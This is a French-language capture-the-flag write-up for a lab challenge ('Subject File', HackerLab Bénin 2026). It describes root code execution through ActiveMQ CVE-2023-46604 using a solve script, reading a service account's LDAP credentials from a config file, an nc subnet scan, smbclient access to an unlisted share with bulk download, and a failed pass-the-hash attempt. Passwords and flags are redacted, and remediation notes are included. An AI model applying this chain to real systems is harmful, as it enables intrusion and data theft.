# Subject File

[Accueil](../../README.md) · [Web](../README.md) · [Index](../../INDEX.md)

## Informations générales

| Champ | Valeur |
|---|---|
| Nom | Subject File |
| Compétition | HackerLab Bénin 2026 |
| Catégorie de classement | Web |
| Difficulté | Non documentée |
| Points | Non documentés |
| Auteur | Non documenté |
| Statut | **Partial** |
| Technologies | SMB, LDAP, ActiveMQ |
| Validation | Aucune validation plateforme exportée |

## 1. Introduction

Retrouver le dossier du sujet dans un partage accessible au compte de service.

Cette édition reconstruit les travaux conservés. Les commandes citées sont historiques, sauf mention explicite d’un contrôle documentaire local. Aucune cible n’a été contactée lors de la rédaction. Les paramètres d’accès et les réponses sont expurgés ; les remplacer depuis les artefacts autorisés pour une reproduction en laboratoire.

**Limites et corrections de cette édition.** Le partage Recon-Data est accessible directement même s’il n’apparaît pas dans la liste SMB. L’échec pass-the-hash rapporté ici ne prouve pas un changement de mot de passe : Restricted Zone rapporte ensuite un succès sur une autre instance. Les adresses et le contexte diffèrent ; la cause du premier refus reste indéterminée.

## 2. Énoncé du challenge

- Challenge 08 — Accéder au dossier du sujet.

### Objectif

Source : [writeup-subject-file.md](evidence/operationtervalis-writeup-subject-file-md.txt)

Retrouver les dossiers relatifs au sujet **SUBJ-7742** (Tims Avald) stockés dans les systèmes internes du FBI Valdoria, puis soumettre le flag de la carte *Subject File* (100 pts).

## 3. Analyse initiale

1 fichiers rattachés directement à ce dossier. Voir l’[inventaire des pièces](evidence/manifest.md), qui indique leur chemin d’origine, leur taille et la décision de publication. Les pièces partagées sont référencées dans les questions apparentées, sans recopier les archives.

### État initial

Source : [writeup-subject-file.md](evidence/operationtervalis-writeup-subject-file-md.txt)

L'instance précédente (sous-réseau `172.28.28.0/24`) a expiré. La nouvelle instance utilise le sous-réseau VPN **`172.28.7.0/24`**, avec une topologie légèrement différente :

| IP VPN            | Rôle                                              |
|-------------------|---------------------------------------------------|
| `172.28.7.3`      | Portail FBI (8080) + ActiveMQ OpenWire (61616)    |
| `172.28.7.2`      | Contrôleur de domaine (LDAP 389 / SMB 445 / KDC 88) |
| `172.28.7.4`      | Serveur SMB supplémentaire (445)                  |

Le conteneur du portail expose en interne deux interfaces : `10.96.6.2` (réseau Docker interne `10.96.6.0/24`) et `172.28.7.3` (réseau VPN). Les hôtes internes (DC `10.96.6.3`, `APP01` `10.96.6.4`, `FS01` `10.96.6.5`) sont également exposés directement sur le VPN (`172.28.7.2`, etc.), ce qui évite d'avoir à pivoter.

## 4. Reconnaissance et investigation

### Reconnaissance

Source : [writeup-subject-file.md](evidence/operationtervalis-writeup-subject-file-md.txt)

### 1. RCE ActiveMQ (CVE-2023-46604)

Le portail expose ActiveMQ 5.18.2 sur le port `61616`, derrière un proxy OpenWire (`/opt/owproxy.py`) qui masque la version mais laisse passer le payload. L'exploit OpenWire (Spring `ClassPathXmlApplicationContext`) permet l'exécution de commandes root dans le conteneur :

```bash
python3 solve.py --target 172.28.7.3 --port 61616 --lport 8001
# hostname -I  ->  10.96.6.2 172.28.7.3
```

### 2. Identifiants de service

Le fichier `/opt/activemq/conf/ad-connector.properties` contient le compte de service LDAP :

```text
ldap.host=dc01.valdoria.fbi.lab
ldap.port=389
ldap.bind.user=svc_web
ldap.bind.password=<omis>
ldap.base.dn=DC=valdoria,DC=fbi,DC=lab
```

### 3. Découverte du DC via VPN

Un scan du `/24` VPN (`172.28.7.0/24`) révèle que le DC est directement joignable (Kerberos 88, LDAP 389, SMB 445), et non seulement via le réseau interne :

```bash
for i in $(seq 1 254); do nc -z -G 1 172.28.7.$i 445/389/88 ...; done
# 172.28.7.2: 88, 389, 445  (DC)
# 172.28.7.3: 8080, 61616   (portail + ActiveMQ)
# 172.28.7.4: 445           (SMB)
```

## 5. Identification du mécanisme

Une absence d’énumération n’est pas une barrière d’autorisation : une connexion directe à un partage connu peut réussir.

### Raisonnement

Source : [writeup-subject-file.md](evidence/operationtervalis-writeup-subject-file-md.txt)

1. Le point d'entrée est l'ActiveMQ vulnérable (indice 1 : « un fichier de l'application contient les accès d'un compte de service » → `svc_web`).
2. Le compte `svc_web` est un compte de service **SMB/LDAP**, pas seulement LDAP : il permet d'énumérer les partages du DC et d'accéder à `Recon-Data`.
3. Le « répertoire caché » est un **partage SMB non listé** (comme les partages administratifs `...$`), d'où le fait qu'il n'apparaît pas dans `smbclient -L` mais reste accessible en nommant directement `//172.28.7.2/Recon-Data`.

## 6. Exploitation ou résolution

### Accès au partage caché « Recon-Data »

Source : [writeup-subject-file.md](evidence/operationtervalis-writeup-subject-file-md.txt)

### Énumération des partages du DC

```bash
smbclient -L //172.28.7.2 -U 'VALDORIA/svc_web%<omis>'
#   sysvol, netlogon, IT-Share, IPC$
```

`IT-Share` est refusé (`NT_STATUS_ACCESS_DENIED`). Le hint indique un « répertoire caché **Recon-Data** », c'est-à-dire un partage **non listé** dans l'énumération. Il est néanmoins accessible directement :

```bash
smbclient //172.28.7.2/Recon-Data -U 'VALDORIA/svc_web%<omis>' -c 'ls'
```

Contenu :

```text
ad_security_audit.txt
tims_profile.txt
tims_profile.pdf
tims_surveillance_report.txt
tims_surveillance_report.pdf
```

### Téléchargement et lecture

```bash
smbclient //172.28.7.2/Recon-Data -U 'VALDORIA/svc_web%<omis>' \
  -c 'prompt OFF; recurse ON; mget *'
```

`tims_profile.txt` est le dossier du sujet (Full Name: **Tims Avald**, Subject ID: **SUBJ-7742**, Alias: **KAPPA**, détenu à **FACILITY KAPPA**). Le flag figure à la fin du document. Il est soumis tel quel, sans espaces.

### Validation reproductible (sans le flag)

Source : [writeup-subject-file.md](evidence/operationtervalis-writeup-subject-file-md.txt)

1. RCE ActiveMQ sur `172.28.7.3:61616`, `hostname -I`.
2. Lecture de `/opt/activemq/conf/ad-connector.properties` → `svc_web` + mot de passe.
3. `smbclient //172.28.7.2/Recon-Data -U 'VALDORIA/svc_web%<mot de passe>' -c 'ls'`.
4. `mget *` puis lecture de `tims_profile.txt` : le sujet `SUBJ-7742` et le flag y figurent.
5. Soumission du flag : la note rapporte une réponse `Correct` ; aucune capture n’est conservée.

Le script `exploit.py` automatise l'ensemble (RCE → découverte du DC → accès `Recon-Data` → extraction du flag).

### Nettoyage

Source : [writeup-subject-file.md](evidence/operationtervalis-writeup-subject-file-md.txt)

- Les tunnels locaux (`smb_tunnel.py`) et les ponts conteneur (`bridge.py`) sont arrêtés.
- Le mot de passe `svc_web` et le flag ne sont pas écrits dans ce document.

## 7. Scripts et automatisation

Aucun script autonome rattaché directement à cette question. Les commandes intégrées aux notes sont reproduites lorsqu’elles existent ; elles ne sont pas déclarées testées dans cette édition.

Les outils partagés sont inventoriés dans [Opération Tervalis](../operation-tervalis/README.md). Les arguments spécifiques à cette question sont ceux des notes historiques.

## 8. Questions et flags

Les réponses ne sont pas publiées, conformément à la règle locale de non-divulgation. Un signalement au hub ne vaut pas acceptation par la compétition.

| Question / objectif | Méthode et preuve | Réponse | Validation |
|---|---|---|---|
| Challenge 08 — Accéder au dossier du sujet. | Voir la reconstruction et les sources de ce dossier. | Non reproduite / inconnue si non résolue | Aucune validation plateforme exportée |

## 9. Difficultés rencontrées

### Pistes qui ont échoué

Source : [writeup-subject-file.md](evidence/operationtervalis-writeup-subject-file-md.txt)

- **Pivot via le conteneur** : un tunnel inverse (LDAP/SMB/Kerberos relayé à travers le conteneur compromis) a été mis en place avant de découvrir que le DC est directement joignable sur le VPN. Inutile en définitive pour cette instance.
- **Délégation contrainte Kerberos** (`svc_mssql` → `cifs/FS01`) : explorée pour atteindre `FS01`, mais superflue puisque `Recon-Data` est sur le DC et accessible avec `svc_web`.
- **`svc_backup` en pass-the-hash** : le hash NT figurant dans l'audit (`34b15040…`) est refusé (`STATUS_LOGON_FAILURE`) — hash périmé (mot de passe modifié après l'audit Q3-2024).
- **`IT-Share`** sur le DC : visible en énumération mais refusé au montage pour `svc_web`.

## 10. Analyse technique approfondie

Une absence d’énumération n’est pas une barrière d’autorisation : une connexion directe à un partage connu peut réussir. Les critères de validation doivent porter sur les données produites, pas seulement sur l’absence d’erreur d’un outil.

## 11. Remédiations

Protéger les partages par ACL et réduire les droits du compte de service ; ne pas stocker de hashes d’authentification dans un audit largement lisible.

## 12. Conclusion

Retrouver le dossier du sujet dans un partage accessible au compte de service. La documentation disponible permet une reconstruction détaillée. Statut retenu : Partial. Aucune validation plateforme exportée.

## 13. Références

Les références sont les pièces locales ci-dessous. Les références Internet citées dans les notes restent historiques et n’ont pas été consultées pendant cette mission.

- [writeup-subject-file.md](evidence/operationtervalis-writeup-subject-file-md.txt) — origine : `operationtervalis/writeup-subject-file.md`.

- [Inventaire local des pièces](evidence/manifest.md).
- [Retour à l’index](../../INDEX.md).

